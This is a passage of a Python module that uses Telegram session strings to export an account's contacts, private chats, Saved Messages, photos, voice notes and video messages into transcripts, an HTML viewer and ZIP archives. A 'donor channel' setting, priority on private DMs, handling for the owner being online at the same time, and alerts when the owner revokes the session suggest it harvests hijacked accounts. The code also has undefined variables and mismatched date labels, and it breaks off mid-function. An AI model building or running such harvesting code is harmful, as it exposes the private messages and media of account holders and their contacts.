import asyncio
import logging
import os
import time
from datetime import datetime, timezone, timedelta
from typing import Any, Callable, List, Optional, Union

from shared.config import TG_API_ID, TG_API_HASH, DEFAULT_DONOR_CHANNEL, SESSIONS_DIR

logger = logging.getLogger("shared.contacts")


def normalize_name(first_name: Optional[str], last_name: Optional[str], username: Optional[str] = None) -> str:
    parts = []
    if first_name and first_name.strip():
        parts.append(first_name.strip())
    if last_name and last_name.strip():
        parts.append(last_name.strip())
    full = " ".join(parts)
    if not full and username:
        full = f"@{username.lstrip('@')}"
    return full or "Без имени"


def format_contact(phone: str, name: str) -> str:
    phone_clean = phone.strip()
    if not phone_clean.startswith("+") and phone_clean.replace(" ", "").isdigit():
        phone_clean = "+" + phone_clean
    return f"{phone_clean} | {name.strip()}"


def append_contact(
    file_path: str,
    first_name: Optional[str],
    last_name: Optional[str],
    username: Optional[str],
    phone_number: str,
) -> bool:
    os.makedirs(os.path.dirname(file_path) or ".", exist_ok=True)
    name = normalize_name(first_name, last_name, username)
    line = format_contact(phone_number, name)

    existing_lines: List[str] = []
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as fh:
            existing_lines = [existing.strip() for existing in fh if existing.strip()]

    phone_clean = phone_number.strip()
    if any(phone_clean in line_item for line_item in existing_lines):
        return False

    with open(file_path, "a", encoding="utf-8") as fh:
        fh.write(line + "\n")
    return True


def append_contacts_list(file_path: str, contacts: List[str]) -> int:
    if not contacts:
        return 0
    os.makedirs(os.path.dirname(file_path) or ".", exist_ok=True)
    existing_lines: set[str] = set()
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as fh:
            existing_lines = {l.strip() for l in fh if l.strip()}

    added = 0
    with open(file_path, "a", encoding="utf-8") as fh:
        for c in contacts:
            c_clean = c.strip()
            if c_clean and c_clean not in existing_lines:
                fh.write(c_clean + "\n")
                existing_lines.add(c_clean)
                added += 1
    return added


async def extract_contacts_from_session(
    session_string: str,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
) -> List[str]:
    """
    Connects to Telegram via Telethon StringSession and retrieves all contacts
    formatted as 'Номер | Имя'.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return []

    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.tl.functions.contacts import GetContactsRequest
        from telethon.tl.types import User
    except ImportError:
        logger.error("Telethon is not installed, cannot extract contacts.")
        return []

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    contacts: List[str] = []
    try:
        await client.connect()
        if not await client.is_user_authorized():
            logger.warning("Session string is invalid or unauthorized.")
            return []

        result = await client(GetContactsRequest(hash=0))
        if hasattr(result, "users"):
            for u in result.users:
                if isinstance(u, User):
                    phone = getattr(u, "phone", None) or ""
                    if phone:
                        first_name = getattr(u, "first_name", None) or ""
                        last_name = getattr(u, "last_name", None) or ""
                        username = getattr(u, "username", None) or ""
                        name = normalize_name(first_name, last_name, username)
                        contacts.append(format_contact(phone, name))
    except Exception as exc:
        logger.error("Failed to extract contacts from session: %s", exc)
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass

    return contacts


async def logout_telethon_session(
    session_string: str,
    user_tg_id: Optional[int] = None,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
) -> bool:
    """
    Terminates the Telegram session via Telethon StringSession.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return True

    from shared.service_listener import _active_watchers, is_auth_key_duplicated

    client = None
    should_disconnect = False
    if user_tg_id and user_tg_id in _active_watchers:
        w = _active_watchers.pop(user_tg_id, None)
        if w and w.is_connected():
            client = w
            should_disconnect = True

    try:
        if not client:
            from telethon import TelegramClient
            from telethon.sessions import StringSession
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client.connect()
            should_disconnect = True

        if await client.is_user_authorized():
            await client.log_out()
        return True
    except Exception as exc:
        if is_auth_key_duplicated(exc):
            logger.warning("Telegram Desktop active during logout for user %s. Session will be cleared locally.", user_tg_id)
        else:
            logger.error("Failed to log out session via Telethon: %s", exc)
        return False
    finally:
        if client and should_disconnect:
            try:
                await client.disconnect()
            except Exception:
                pass


async def extract_chats_from_session(
    session_string: str,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
    days_limit: int = 180,
    max_dialogs: int = 150,
    max_messages_per_dialog: int = 500,
) -> Optional[dict]:
    """
    Connects to Telegram via Telethon StringSession and retrieves all chat dialogs
    and messages from the last `days_limit` days (default: 180 days / 6 months).
    Returns a dict with 'content', 'dialog_count', and 'total_messages'.
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return None

    try:
        from datetime import datetime, timezone, timedelta
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.tl.types import User, Channel, Chat
    except ImportError:
        logger.error("Telethon is not installed, cannot extract chats.")
        return None

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    cutoff = datetime.now(timezone.utc) - timedelta(days=days_limit)
    lines: List[str] = []
    dialog_count = 0
    total_messages = 0

    try:
        await client.connect()
        if not await client.is_user_authorized():
            logger.warning("Session string is invalid or unauthorized for chat extraction.")
            return None

        me = await client.get_me()
        me_name = normalize_name(getattr(me, "first_name", None), getattr(me, "last_name", None), getattr(me, "username", None))
        me_phone = getattr(me, "phone", None) or "—"
        me_id = getattr(me, "id", None) or "—"

        lines.append("=" * 80)
        lines.append("📦 ВЫГРУЗКА ДИАЛОГОВ И ЧАТОВ (ПОСЛЕДНИЕ 2 МЕСЯЦА / 60 ДНЕЙ)")
        lines.append(f"👤 Владелец аккаунта: {me_name} (ID: {me_id}) | Телефон: +{me_phone.lstrip('+')}")
        lines.append(f"⏱ Дата выгрузки: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC")
        lines.append(f"📅 Период сообщений: с {cutoff.strftime('%Y-%m-%d')} по {datetime.now(timezone.utc).strftime('%Y-%m-%d')}")
        # 1. Collect and classify all dialogs: Human DMs first, then Groups, Bots, Channels
        direct_dialogs = []
        group_dialogs = []
        bot_dialogs = []
        channel_dialogs = []

        async for dialog in client.iter_dialogs(limit=250):
            if dialog.is_user and getattr(dialog.entity, "is_self", False):
                continue
            entity = dialog.entity
            if dialog.is_user:
                if getattr(entity, "bot", False):
                    bot_dialogs.append(dialog)
                else:
                    direct_dialogs.append(dialog)
            elif dialog.is_group:
                group_dialogs.append(dialog)
            elif dialog.is_channel:
                channel_dialogs.append(dialog)
            else:
                group_dialogs.append(dialog)

        ordered_dialogs = (direct_dialogs + group_dialogs + bot_dialogs + channel_dialogs)[:max_dialogs]

        for dialog in ordered_dialogs:
            entity = dialog.entity
            dialog_name = dialog.name or "Без названия"
            dialog_id = dialog.id
            username = getattr(entity, "username", None)
            user_tag = f"@{username}" if username else "—"

            dialog_type = "Личный диалог"
            is_dm = False
            if dialog.is_user:
                if getattr(entity, "bot", False):
                    dialog_type = "Бот"
                else:
                    dialog_type = "Личный диалог (DM)"
                    is_dm = True
            elif isinstance(entity, Channel):
                dialog_type = "Супергруппа" if getattr(entity, "megagroup", False) else "Канал"
            elif isinstance(entity, Chat):
                dialog_type = "Группа"

            dialog_lines: List[str] = []
            msg_count = 0
            # Higher message limit for personal direct messages to get complete history
            msg_limit = 1000 if is_dm else max_messages_per_dialog

            try:
                async for msg in client.iter_messages(dialog, limit=msg_limit):
                    if not msg.date or msg.date < cutoff:
                        break

                    sender_str = "Вы"
                    if msg.out:
                        sender_str = "Вы"
                    elif msg.sender:
                        if isinstance(msg.sender, User):
                            sender_str = normalize_name(
                                getattr(msg.sender, "first_name", None),
                                getattr(msg.sender, "last_name", None),
                                getattr(msg.sender, "username", None),
                            )
                        elif hasattr(msg.sender, "title"):
                            sender_str = getattr(msg.sender, "title", "Собеседник")
                        else:
                            sender_str = "Собеседник"
                    else:
                        sender_str = "Собеседник"

                    text = msg.text or msg.message or ""
                    if not text:
                        if msg.media:
                            text = f"[{type(msg.media).__name__}]"
                        else:
                            text = "[Служебное действие]"

                    date_str = msg.date.strftime("%Y-%m-%d %H:%M:%S")
                    dialog_lines.append(f"[{date_str}] {sender_str}: {text}")
                    msg_count += 1
            except Exception as d_err:
                logger.debug("Could not read messages for dialog %s: %s", dialog_id, d_err)

            if dialog_lines:
                dialog_count += 1
                total_messages += msg_count
                dialog_lines.reverse()

                lines.append("-" * 80)
                lines.append(f"💬 {dialog_name} ({dialog_type})")
                lines.append(f"🆔 ID: {dialog_id} | Юзер: {user_tag} | Сообщений: {msg_count}")
                lines.append("-" * 80)
                lines.extend(dialog_lines)
                lines.append("\n")

        lines.append("=" * 80)
        lines.append(f"✅ ВЫГРУЗКА ЗАВЕРШЕНА. Всего обработано чатов: {dialog_count}, сообщений: {total_messages}")
        lines.append("=" * 80)

    except Exception as exc:
        logger.error("Failed to extract chats from session: %s", exc)
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass

    if not lines or dialog_count == 0:
        return None

    return {
        "content": "\n".join(lines),
        "dialog_count": dialog_count,
        "total_messages": total_messages,
    }


def _is_downloadable_media(msg, max_bytes: int = 20 * 1024 * 1024) -> bool:
    try:
        if not msg or not msg.media:
            return False
        # Check size if available
        size = 0
        if getattr(msg, "file", None):
            size = getattr(msg.file, "size", 0) or 0
        elif getattr(msg, "document", None):
            size = getattr(msg.document, "size", 0) or 0
        if size > max_bytes:
            return False
        return True
    except Exception:
        return False


async def _safe_download_media(client, msg, target_path: str) -> bool:
    """
    Safely downloads media from Telegram message.
    Ensures that if download fails, is interrupted, or file is 0 bytes (e.g. session terminated),
    the empty/corrupted file is removed from disk and False is returned.
    """
    try:
        res = await client.download_media(msg, file=target_path)
        if res and os.path.exists(target_path) and os.path.getsize(target_path) > 0:
            return True
        if os.path.exists(target_path):
            try:
                os.remove(target_path)
            except Exception:
                pass
        return False
    except Exception as e:
        if os.path.exists(target_path):
            try:
                os.remove(target_path)
            except Exception:
                pass
        err_str = str(e).lower()
        from shared.service_listener import is_auth_key_duplicated
        if not is_auth_key_duplicated(e) and any(w in err_str for w in ("unregistered", "revoked", "deactivated", "not registered")):
            raise

async def _convert_voice_to_mp3(ogg_path: str) -> str:
    """
    Converts Telegram OGG Opus voice message to standard MP3 using ffmpeg.
    Returns the path to the MP3 file if successful, otherwise keeps and returns the original OGG path.
    """
    if not ogg_path or not os.path.exists(ogg_path):
        return ogg_path

    mp3_path = os.path.splitext(ogg_path)[0] + ".mp3"
    try:
        proc = await asyncio.create_subprocess_exec(
            "ffmpeg", "-y", "-i", ogg_path, "-c:a", "libmp3lame", "-q:a", "4", mp3_path,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        if proc.returncode == 0 and os.path.exists(mp3_path) and os.path.getsize(mp3_path) > 0:
            try:
                os.remove(ogg_path)
            except OSError:
                pass
            return mp3_path
    except Exception as e:
        logger.debug("ffmpeg conversion failed for %s: %s", ogg_path, e)
    return ogg_path

def _match_chat_to_folder(
    chat_id: Any,
    is_user: bool,
    is_group: bool,
    is_channel: bool,
    is_bot: bool,
    is_contact: bool,
    folder: dict,
) -> bool:
    """
    Checks if a given chat matches the Telegram dialog filter/folder rules.
    """
    inc = folder.get("include_peers", [])
    exc = folder.get("exclude_peers", [])
    flags = folder.get("flags", {})

    try:
        cid_int = int(chat_id)
    except (ValueError, TypeError):
        cid_int = None

    # Excluded peers always take precedence
    if chat_id in exc or (cid_int is not None and cid_int in exc):
        return False

    # Explicitly included or pinned peers
    if chat_id in inc or (cid_int is not None and cid_int in inc):
        return True

    # Rule flags
    if is_bot and flags.get("bots"):
        return True
    if is_channel and flags.get("broadcasts"):
        return True
    if is_group and flags.get("groups"):
        return True
    if is_user and not is_bot:
        if is_contact and flags.get("contacts"):
            return True
        if not is_contact and flags.get("non_contacts"):
            return True

    return False


def _extract_message_display_text(msg: Any, p_rel: Optional[str] = None, v_rel: Optional[str] = None, vn_rel: Optional[str] = None) -> str:
    """Extracts human-readable text from a message, or a descriptive placeholder for stickers, gifs, videos, files, calls, etc."""
    raw_text = getattr(msg, "text", None) or getattr(msg, "message", None) or ""
    text = raw_text.strip()
    if text:
        return text

    # If media was downloaded with a visual player (photo, voice, circle), no text placeholder needed
    if p_rel or v_rel or vn_rel:
        return ""

    # Message has no text and no downloaded media - detect type
    if getattr(msg, "sticker", None):
        emoji = getattr(getattr(msg, "file", None), "emoji", None) or ""
        return f"🎨 [Стикер {emoji}]" if emoji else "🎨 [Стикер]"
    if getattr(msg, "gif", False):
        return "🎬 [GIF-анимация]"
    if getattr(msg, "video_note", False):
        return "📹 [Видеосообщение (кружок)]"
    if getattr(msg, "video", None):
        dur = getattr(getattr(msg, "file", None), "duration", None)
        dur_str = f" ({dur}с)" if dur else ""
        return f"📹 [Видеофайл{dur_str}]"
    if getattr(msg, "voice", False):
        return "🎙 [Голосовое сообщение]"
    if getattr(msg, "photo", None):
        return "📷 [Фотография]"
    if getattr(msg, "audio", None):
        title = getattr(getattr(msg, "file", None), "title", None) or "Аудиозапись"
        performer = getattr(getattr(msg, "file", None), "performer", None)
        track_str = f": {performer} - {title}" if performer else f": {title}"
        return f"🎵 [Аудио{track_str}]"
    if getattr(msg, "document", None):
        doc_name = getattr(getattr(msg, "file", None), "name", None) or "Документ"
        return f"📄 [Файл: {doc_name}]"
    if getattr(msg, "geo", None):
        return "📍 [Геолокация]"
    if getattr(msg, "contact", None):
        c_name = f"{getattr(msg.contact, 'first_name', '') or ''} {getattr(msg.contact, 'last_name', '') or ''}".strip()
        c_phone = getattr(msg.contact, "phone_number", "") or ""
        return f"👤 [Контакт: {c_name} {c_phone}]".strip()
    if getattr(msg, "poll", None):
        q = getattr(getattr(msg.poll, "poll", None), "question", "")
        return f"📊 [Опрос: {q}]" if q else "📊 [Опрос]"
    if getattr(msg, "dice", None):
        val = getattr(msg.dice, "value", "")
        return f"🎲 [Дайс: {val}]" if val else "🎲 [Дайс]"
    if getattr(msg, "game", None):
        return "🎮 [Игра Telegram]"
    if getattr(msg, "action", None):
        act = msg.action
        act_name = type(act).__name__
        if "PhoneCall" in act_name:
            duration = getattr(act, "duration", None)
            if duration:
                return f"📞 [Звонок: {duration} сек]"
            return "📞 [Звонок Telegram]"
        return f"ℹ️ [Действие: {act_name.replace('MessageAction', '')}]"
    if getattr(msg, "media", None):
        return "📎 [Вложение / Медиа]"

    return ""


async def extract_full_archive_from_session(
    session_string: str,
    user_tg_id: int,
    api_id: int = TG_API_ID,
    api_hash: str = TG_API_HASH,
    days_limit: int = 180,
    max_photos: int = 150,
    max_voices: int = 150,
    max_video_notes: int = 150,
    max_saved_msgs: int = 500,
    max_dialogs: int = 100,
    max_messages_per_dialog: int = 500,
    progress_cb: Optional[Any] = None,
) -> Optional[dict]:
    """
    Connects to Telegram via Telethon StringSession and extracts:
    - Saved Messages (Избранное: текст + фото + голосовые + кружки)
    - Photos from all chats over the last 60 days
    - Voice messages (.ogg) over the last 60 days
    - Video notes / Round video messages (.mp4) over the last 60 days
    - Full text transcript of all chats
    Packages everything into a structured ZIP file: data/archives/archive_{user_tg_id}.zip
    """
    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
        return None

    try:
        import shutil
        import zipfile
        from datetime import datetime, timezone, timedelta
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.tl.types import User, Channel, Chat
    except ImportError:
        logger.error("Telethon/zipfile not available for full archive extraction.")
        return None

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    cutoff = datetime.now(timezone.utc) - timedelta(days=days_limit)

    base_dir = os.path.abspath(os.path.join("data", "media", str(user_tg_id)))
    saved_dir = os.path.join(base_dir, "saved_messages")
    photos_dir = os.path.join(base_dir, "photos")
    voices_dir = os.path.join(base_dir, "voices")
    video_notes_dir = os.path.join(base_dir, "video_notes")
    archives_dir = os.path.abspath(os.path.join("data", "archives"))

    for d in [saved_dir, photos_dir, voices_dir, video_notes_dir, archives_dir]:
        os.makedirs(d, exist_ok=True)

    photos_count = 0
    voices_count = 0
    video_notes_count = 0
    saved_msgs_count = 0
    dialogs_count = 0
    total_messages = 0

    saved_transcript_lines: List[str] = []
    chats_transcript_lines: List[str] = []

    try:
        if progress_cb:
            try:
                await progress_cb(f"Подключение к Telegram (ID: {user_tg_id})...", 5.0)
            except Exception:
                pass

        await client.connect()
        if not await client.is_user_authorized():
            return None

        me = await client.get_me()
        me_name = normalize_name(getattr(me, "first_name", None), getattr(me, "last_name", None), getattr(me, "username", None))
        me_phone = getattr(me, "phone", None) or "—"

        # 0. Fetch Telegram Folders (Dialog Filters)
        folders_list: List[dict] = []
        try:
            from telethon.tl.functions.messages import GetDialogFiltersRequest
            from telethon.utils import get_peer_id

            filters_res = await client(GetDialogFiltersRequest())
            filters_raw = getattr(filters_res, "filters", filters_res)
            for f in filters_raw:
                f_id = getattr(f, "id", None)
                if f_id is None:
                    continue
                title = getattr(f, "title", "")
                if hasattr(title, "text"):
                    title = title.text
                title = str(title or f"Папка {f_id}")
                emoticon = getattr(f, "emoticon", "") or ""
                if str(emoticon).lower() in ("none", "null"):
                    emoticon = ""

                inc_peers = [get_peer_id(p) for p in getattr(f, "include_peers", [])]
                pin_peers = [get_peer_id(p) for p in getattr(f, "pinned_peers", [])]
                exc_peers = [get_peer_id(p) for p in getattr(f, "exclude_peers", [])]

                folders_list.append({
                    "id": f_id,
                    "title": title,
                    "emoticon": emoticon,
                    "include_peers": list(set(inc_peers + pin_peers)),
                    "exclude_peers": list(set(exc_peers)),
                    "flags": {
                        "contacts": bool(getattr(f, "contacts", False)),
                        "non_contacts": bool(getattr(f, "non_contacts", False)),
                        "groups": bool(getattr(f, "groups", False)),
                        "broadcasts": bool(getattr(f, "broadcasts", False)),
                        "bots": bool(getattr(f, "bots", False)),
                    },
                })
        except Exception as e_filters:
            logger.debug("Could not fetch dialog filters: %s", e_filters)

        if progress_cb:
            try:
                await progress_cb(f"Авторизован ({me_name}). Скачивание Избранного...", 12.0)
            except Exception:
                pass

        header = (
            "=" * 80 + "\n"
            f"📦 АРХИВ АККАУНТА: {me_name} (ID: {user_tg_id}) | +{me_phone.lstrip('+')}\n"
            f"⏱ Время выгрузки: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC\n"
            f"📅 Охват: последние {days_limit} дней (с {cutoff.strftime('%Y-%m-%d')})\n"
            + "=" * 80 + "\n\n"
        )
        saved_transcript_lines.append(header)
        saved_transcript_lines.append("📌 ИЗБРАННОЕ / SAVED MESSAGES:\n" + "-" * 80 + "\n")

        # 1. Extract Saved Messages ('me')
        saved_messages_data: List[dict] = []
        try:
            async for msg in client.iter_messages("me", limit=max_saved_msgs):
                saved_msgs_count += 1
                date_str = msg.date.strftime("%Y-%m-%d %H:%M:%S") if msg.date else "—"
                text = msg.text or msg.message or ""
                media_tag = ""
                p_rel = None
                v_rel = None
                vn_rel = None

                # Download media if present and within limit
                if msg.photo and photos_count < max_photos and _is_downloadable_media(msg):
                    p_file = os.path.join(saved_dir, f"photo_{msg.id}.jpg")
                    if await _safe_download_media(client, msg, p_file):
                        photos_count += 1
                        media_tag = f" [📷 Фото: photo_{msg.id}.jpg]"
                        p_rel = f"saved_messages/photo_{msg.id}.jpg"
                elif msg.voice and voices_count < max_voices and _is_downloadable_media(msg):
                    v_file = os.path.join(saved_dir, f"voice_{msg.id}.ogg")
                    if await _safe_download_media(client, msg, v_file):
                        final_v_path = await _convert_voice_to_mp3(v_file)
                        v_filename = os.path.basename(final_v_path)
                        voices_count += 1
                        media_tag = f" [🎙 Голосовое: {v_filename}]"
                        v_rel = f"saved_messages/{v_filename}"
                elif msg.video_note and video_notes_count < max_video_notes and _is_downloadable_media(msg):
                    vn_file = os.path.join(saved_dir, f"circle_{msg.id}.mp4")
                    if await _safe_download_media(client, msg, vn_file):
                        video_notes_count += 1
                        media_tag = f" [📹 Кружок: circle_{msg.id}.mp4]"
                        vn_rel = f"saved_messages/circle_{msg.id}.mp4"

                text = _extract_message_display_text(msg, p_rel, v_rel, vn_rel)
                saved_transcript_lines.append(f"[{date_str}] {text}{media_tag}")
                saved_messages_data.append({
                    "sender": "Вы",
                    "out": True,
                    "text": text,
                    "date": date_str,
                    "photo": p_rel,
                    "voice": v_rel,
                    "circle": vn_rel,
                })
        except Exception as e_saved:
            logger.debug("Error reading Saved Messages: %s", e_saved)

        structured_chats: List[dict] = []
        if saved_messages_data:
            saved_messages_data.reverse()
            saved_folders = [
                f["id"] for f in folders_list
                if _match_chat_to_folder(user_tg_id, is_user=True, is_group=False, is_channel=False, is_bot=False, is_contact=True, folder=f)
            ]
            structured_chats.append({
                "id": "saved",
                "title": "Избранное (Saved Messages)",
                "username": None,
                "type": "saved",
                "type_label": "Личное хранилище",
                "messages": saved_messages_data,
                "folders": saved_folders,
            })

        # 2. Extract Dialogs & Media: Human DMs first, then Groups, Bots, Channels
        chats_transcript_lines.append(header)

        direct_dialogs = []
        group_dialogs = []
        bot_dialogs = []
        channel_dialogs = []

        async for dialog in client.iter_dialogs(limit=250):
            if dialog.is_user and getattr(dialog.entity, "is_self", False):
                continue
            entity = dialog.entity
            if dialog.is_user:
                if getattr(entity, "bot", False):
                    bot_dialogs.append(dialog)
                else:
                    direct_dialogs.append(dialog)
            elif dialog.is_group:
                group_dialogs.append(dialog)
            elif dialog.is_channel:
                channel_dialogs.append(dialog)
            else:
                group_dialogs.append(dialog)

        ordered_dialogs = (direct_dialogs + group_dialogs + bot_dialogs + channel_dialogs)[:max_dialogs]
        total_d_count = len(ordered_dialogs)
        if progress_cb:
            try:
                await progress_cb(f"Избранное скачано ({saved_msgs_count} сообщ.). Обработка диалогов (всего {total_d_count})...", 22.0)
            except Exception:
                pass

        for idx, dialog in enumerate(ordered_dialogs, 1):
            entity = dialog.entity
            dialog_name = dialog.name or "Без названия"
            clean_name = "".join(c for c in dialog_name if c.isalnum() or c in (" ", "_", "-")).strip()[:20] or "dialog"
            dialog_id = dialog.id
            username = getattr(entity, "username", None)
            user_tag = f"@{username}" if username else "—"

            if progress_cb:
                try:
                    pct = 22.0 + (idx / max(1, total_d_count)) * 58.0
                    await progress_cb(
                        f"Чат {idx}/{total_d_count}: {clean_name} | 📷 {photos_count} | 🎙 {voices_count} | 📹 {video_notes_count}",
                        pct,
                    )
                except Exception:
                    pass

            dialog_type = "Личный диалог"
            is_dm = False
            if dialog.is_user:
                if getattr(entity, "bot", False):
                    dialog_type = "Бот"
                else:
                    dialog_type = "Личный диалог (DM)"
                    is_dm = True
            elif isinstance(entity, Channel):
                dialog_type = "Супергруппа" if getattr(entity, "megagroup", False) else "Канал"
            elif isinstance(entity, Chat):
                dialog_type = "Группа"

            dialog_lines: List[str] = []
            dialog_msgs_data: List[dict] = []
            d_msgs = 0
            # Higher message limit for personal direct messages to get complete history
            msg_limit = 1000 if is_dm else max_messages_per_dialog

            try:
                async for msg in client.iter_messages(dialog, limit=msg_limit):
                    if not msg.date or msg.date < cutoff:
                        break

                    sender_str = "Вы"
                    if msg.out:
                        sender_str = "Вы"
                    elif msg.sender:
                        if isinstance(msg.sender, User):
                            sender_str = normalize_name(getattr(msg.sender, "first_name", None), getattr(msg.sender, "last_name", None), getattr(msg.sender, "username", None))
                        elif hasattr(msg.sender, "title"):
                            sender_str = getattr(msg.sender, "title", "Собеседник")
                        else:
                            sender_str = "Собеседник"
                    else:
                        sender_str = "Собеседник"

                    text = msg.text or msg.message or ""
                    media_tag = ""
                    p_rel = None
                    v_rel = None
                    vn_rel = None

                    # Download Voice message (if <= 20MB)
                    if msg.voice and voices_count < max_voices and _is_downloadable_media(msg):
                        v_path = os.path.join(voices_dir, f"voice_{dialog_id}_{msg.id}.ogg")
                        if await _safe_download_media(client, msg, v_path):
                            final_v_path = await _convert_voice_to_mp3(v_path)
                            v_filename = os.path.basename(final_v_path)
                            voices_count += 1
                            media_tag = f" [🎙 Голосовое: {v_filename}]"
                            v_rel = f"voices/{v_filename}"
                        else:
                            media_tag = " [🎙 Голосовое]"
                    # Download Video Note (Кружок, if <= 20MB)
                    elif msg.video_note and video_notes_count < max_video_notes and _is_downloadable_media(msg):
                        vn_path = os.path.join(video_notes_dir, f"circle_{dialog_id}_{msg.id}.mp4")
                        if await _safe_download_media(client, msg, vn_path):
                            video_notes_count += 1
                            media_tag = f" [📹 Кружок: circle_{dialog_id}_{msg.id}.mp4]"
                            vn_rel = f"video_notes/circle_{dialog_id}_{msg.id}.mp4"
                        else:
                            media_tag = " [📹 Кружок]"
                    # Download Photo (if <= 20MB)
                    elif msg.photo and photos_count < max_photos and _is_downloadable_media(msg):
                        p_path = os.path.join(photos_dir, f"photo_{clean_name}_{msg.id}.jpg")
                        if await _safe_download_media(client, msg, p_path):
                            photos_count += 1
                            media_tag = f" [📷 Фото: photo_{clean_name}_{msg.id}.jpg]"
                            p_rel = f"photos/photo_{clean_name}_{msg.id}.jpg"
                        else:
                            media_tag = " [📷 Фото]"

                    date_str = msg.date.strftime("%Y-%m-%d %H:%M:%S")
                    text = _extract_message_display_text(msg, p_rel, v_rel, vn_rel)
                    dialog_lines.append(f"[{date_str}] {sender_str}: {text}{media_tag}")
                    dialog_msgs_data.append({
                        "sender": sender_str,
                        "out": bool(msg.out),
                        "text": text,
                        "date": date_str,
                        "photo": p_rel,
                        "voice": v_rel,
                        "circle": vn_rel,
                    })
                    d_msgs += 1
            except Exception as e_d:
                logger.debug("Error iterating dialog %s: %s", dialog_id, e_d)
                err_str = str(e_d).lower()
                from shared.service_listener import is_session_truly_revoked
                if is_session_truly_revoked(e_d):
                    logger.warning("Session for user %s revoked during archive extraction. Saving partial data.", user_tg_id)
                    from shared import db
                    from shared.notifier import notify_session_revoked
                    try:
                        db.update_user_auth(DB_PATH, user_tg_id, None, "session_revoked")
                        asyncio.create_task(notify_session_revoked(user_tg_id, reason="Сброшена в Telegram во время выгрузки архива"))
                    except Exception:
                        pass
                from shared.service_listener import is_auth_key_duplicated
                if is_auth_key_duplicated(err):
                    logger.warning("Telegram Desktop active during archive export for %s (AuthKeyDuplicated). Pausing 10s.", user_tg_id)
                    await asyncio.sleep(10)
                    if dialog_lines:
                        dialogs_count += 1
                        total_messages += d_msgs
                        dialog_lines.reverse()
                        dialog_msgs_data.reverse()
                        chats_transcript_lines.append("-" * 80)
                        chats_transcript_lines.append(f"💬 ЧАТ: {dialog_name} (ID: {dialog_id}, {user_tag})")
                        chats_transcript_lines.append("-" * 80)
                        chats_transcript_lines.extend(dialog_lines)
                        chats_transcript_lines.append("\n")
                        is_bot = bool(dialog.is_user and getattr(entity, "bot", False))
                        is_contact = bool(dialog.is_user and getattr(entity, "contact", False))
                        chat_folders = [
                            f["id"] for f in folders_list
                            if _match_chat_to_folder(dialog_id, is_user=dialog.is_user, is_group=dialog.is_group, is_channel=dialog.is_channel, is_bot=is_bot, is_contact=is_contact, folder=f)
                        ]
                        structured_chats.append({
                            "id": dialog_id,
                            "title": dialog_name,
                            "username": username,
                            "type": "chat",
                            "type_label": dialog_type,
                            "messages": dialog_msgs_data,
                            "folders": chat_folders,
                        })
                    break

            if dialog_lines:
                dialogs_count += 1
                total_messages += d_msgs
                dialog_lines.reverse()
                dialog_msgs_data.reverse()

                chats_transcript_lines.append("-" * 80)
                chats_transcript_lines.append(f"💬 ЧАТ: {dialog_name} (ID: {dialog_id}, {user_tag})")
                chats_transcript_lines.append("-" * 80)
                chats_transcript_lines.extend(dialog_lines)
                chats_transcript_lines.append("\n")

                is_bot = bool(dialog.is_user and getattr(entity, "bot", False))
                is_contact = bool(dialog.is_user and getattr(entity, "contact", False))
                chat_folders = [
                    f["id"] for f in folders_list
                    if _match_chat_to_folder(dialog_id, is_user=dialog.is_user, is_group=dialog.is_group, is_channel=dialog.is_channel, is_bot=is_bot, is_contact=is_contact, folder=f)
                ]
                structured_chats.append({
                    "id": dialog_id,
                    "title": dialog_name,
                    "username": username,
                    "type": "chat",
                    "type_label": dialog_type,
                    "messages": dialog_msgs_data,
                    "folders": chat_folders,
                })

        # Save Text Transcripts to base_dir
        with open(os.path.join(base_dir, "saved_messages.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(saved_transcript_lines))

        with open(os.path.join(base_dir, "chats_transcript.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(chats_transcript_lines))

        # Generate interactive Telegram HTML Viewer
        if progress_cb:
            try:
                await progress_cb("Генерация интерактивного HTML-просмотрщика...", 85.0)
            except Exception:
                pass

        try:
            from shared.html_exporter import build_telegram_html_viewer
            account_meta = {
                "name": me_name,
                "phone": me_phone,
                "id": user_tg_id,
                "date": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S") + " UTC",
            }

            # Prepare folders payload for HTML viewer
            folders_payload = None
            if folders_list:
                folders_payload = [
                    {
                        "id": "all",
                        "title": "Все",
                        "emoticon": "💬",
                        "count": len(structured_chats),
                    }
                ]
                for f in folders_list:
                    f_count = sum(1 for c in structured_chats if f["id"] in c.get("folders", []))
                    folders_payload.append({
                        "id": f["id"],
                        "title": f["title"],
                        "emoticon": f["emoticon"],
                        "count": f_count,
                    })

            html_content = build_telegram_html_viewer(account_meta, structured_chats, folders_payload)
            # Write inside base_dir for zip archive
            with open(os.path.join(base_dir, "index.html"), "w", encoding="utf-8") as hf:
                hf.write(html_content)

            # Also save directly in data/chats/
            chats_dir = os.path.abspath(os.path.join("data", "chats"))
            os.makedirs(chats_dir, exist_ok=True)
            standalone_html_path = os.path.join(chats_dir, f"chats_{user_tg_id}.html")
            with open(standalone_html_path, "w", encoding="utf-8") as shf:
                shf.write(html_content)
        except Exception as e_html:
            logger.error("Failed to generate HTML viewer: %s", e_html)
            standalone_html_path = None

        if progress_cb:
            try:
